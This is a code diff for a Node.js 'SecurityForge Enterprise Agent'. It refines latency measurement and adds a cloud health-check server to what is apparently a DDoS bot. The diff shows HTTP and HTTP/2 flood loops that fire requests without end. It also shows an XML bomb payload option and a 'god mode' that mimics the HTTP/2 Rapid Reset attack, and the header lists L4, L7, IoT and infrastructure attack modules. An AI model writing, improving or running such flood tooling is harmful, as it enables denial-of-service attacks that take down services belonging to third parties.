@@ -1,11 +1,12 @@
 /**
- * SECURITYFORGE ENTERPRISE AGENT V41.0.4 (JS COMPATIBILITY FIX)
+ * SECURITYFORGE ENTERPRISE AGENT V41.0.6 (LATENCY FIX)
  * 
  * [SYSTEM ARCHITECTURE]
  * - CORE: Native Node.js Modules (Net, Dgram, TLS, HTTP/2) for raw socket manipulation.
  * - RECON: Smart Crawler (Robots.txt parser, HTML link extractor).
  * - THREADING: Async non-blocking event loop with high-concurrency dispatch.
  * - TELEMETRY: Real-time aggregation of RPS, Latency (P50/P90), and Success Rates.
+ * - HEALTH: Integrated HTTP Server for Cloud Health Checks (Port Binding).
  */
 
 const https = require('https');
@@ -194,6 +195,8 @@ const runHttpFlood = (job, target) => {
     const attack = () => {
         if (!STATE.running) return;
         const method = job.method === 'GET' ? 'GET' : 'POST';
+        const start = process.hrtime();
+        
         const req = lib.request({
             host: target.host,
             port: target.port,
@@ -208,6 +211,11 @@ const runHttpFlood = (job, target) => {
                 ...(job.use_god_mode ? {'Accept-Encoding': 'gzip, deflate, br'} : {})
             }
         }, (res) => {
+            // LATENCY CALCULATION ON RESPONSE (TTFB)
+            const diff = process.hrtime(start);
+            STATE.stats.latencySum += (diff[0] * 1000 + diff[1] / 1e6);
+            STATE.stats.latencyCount++;
+            
             STATE.stats.success++;
             res.resume(); // Drain
             if (STATE.running) setImmediate(attack);
@@ -219,13 +227,6 @@ const runHttpFlood = (job, target) => {
             req.write(job.use_xml_bomb ? PAYLOADS.XML_BOMB : (job.body || '{"test":true}'));
         }
         
-        const start = process.hrtime();
-        req.on('finish', () => {
-            const diff = process.hrtime(start);
-            STATE.stats.latencySum += (diff[0] * 1000 + diff[1] / 1e6);
-            STATE.stats.latencyCount++;
-        });
-
         req.end();
     };
     attack();
@@ -240,13 +241,20 @@ const runHttp2Flood = (job, target) => {
     
     const attack = () => {
         if (!STATE.running || client.destroyed) return;
+        const start = process.hrtime();
         const req = client.request({ 
             ':path': target.path, 
             ':method': job.method || 'GET',
             'User-Agent': USER_AGENTS[0]
         });
         
-        req.on('response', () => { STATE.stats.success++; });
+        req.on('response', () => { 
+             const diff = process.hrtime(start);
+             STATE.stats.latencySum += (diff[0] * 1000 + diff[1] / 1e6);
+             STATE.stats.latencyCount++;
+             STATE.stats.success++; 
+        });
+        
         req.on('end', () => { 
             if (job.use_god_mode) req.close(); // Rapid Reset style
             if (STATE.running) setImmediate(attack);
@@ -418,7 +426,7 @@ const startJob = (job) => {
     STATE.priorityLogs = [];
     STATE.dynamicPaths = [];
     
-    log(`STARTING JOB ${job.id} | TARGET: ${job.target} | THREADS: ${job.concurrency} | V41.0.4`);
+    log(`STARTING JOB ${job.id} | TARGET: ${job.target} | THREADS: ${job.concurrency} | V41.0.6`);
 
     const target = getTargetDetails(job.target);
     if (!target) { log("INVALID TARGET URL", 'ERROR'); return; }
@@ -523,5 +531,23 @@ setInterval(async () => {
     }
 }, 1000);
 
-console.log('SecurityForge Enterprise Agent V41.0.4 Online');
+// ==========================================
+// 8. HEALTH CHECK SERVER (REQUIRED FOR CLOUD)
+// ==========================================
+const PORT = process.env.PORT || 3000;
+const server = http.createServer((req, res) => {
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ 
+        status: 'online', 
+        agent: 'SecurityForge V41.0.6', 
+        state: STATE.running ? 'BUSY' : 'IDLE',
+        stats: STATE.stats 
+    }, null, 2));
+});
+
+server.listen(PORT, '0.0.0.0', () => {
+    console.log(`Health Check Server listening on port ${PORT}`);
+});
+
+console.log('SecurityForge Enterprise Agent V41.0.6 Online');
 console.log('Modules Loaded: L7, L4, IoT, Infra, Smart Recon');
